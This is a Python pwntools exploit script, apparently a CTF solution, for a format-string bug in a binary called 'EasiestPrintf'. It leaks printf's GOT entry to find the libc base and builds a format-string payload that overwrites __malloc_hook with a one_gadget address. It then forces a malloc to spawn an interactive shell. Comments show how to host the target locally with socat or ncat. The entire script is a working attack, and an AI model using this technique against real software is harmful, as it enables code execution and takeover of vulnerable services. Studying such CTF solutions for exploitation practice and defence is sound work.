#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.arch = 'i386'
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./EasiestPrintf")
if sys.argv[1] == "l":
    context.log_level = "debug"
    io = process("./EasiestPrintf", env = {"LD_PRELOAD": "./libc_so"})
    libc = ELF("./libc_so")
    oneGadget = 0x3ac5c


else:
    '''
    socat -d -d TCP-LISTEN:9999,reuseaddr,fork EXEC:"env LD_PRELOAD=./libc_so ./EasiestPrintf"

    ncat -vc "LD_PRELOAD=./libc_so ./EasiestPrintf" -kl 127.0.0.1 9999
    '''
    io = remote("localhost", 9999)
    libc = ELF("./libc_so")
    oneGadget = 0x3ac5c


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    io.sendlineafter(":\n", str(elf.got['printf']))
    libc.address = int(io.recvuntil("\n", drop = True), 16) - libc.sym['printf']
    success("libc.address -> {:#x}".format(libc.address))
    #  pause()

    mallocHook = libc.sym['__malloc_hook']
    freeHook = libc.sym['__free_hook']
    oneGadget = libc.address + oneGadget
    success("oneGadget -> {:#x}".format(oneGadget) )

    payload = fmtstr_payload(7, {mallocHook: oneGadget})
    payload += "%100000c"
    #  DEBUG("b *0x804881C\nc")
    io.sendline(payload)
    
    io.interactive()
    io.close()
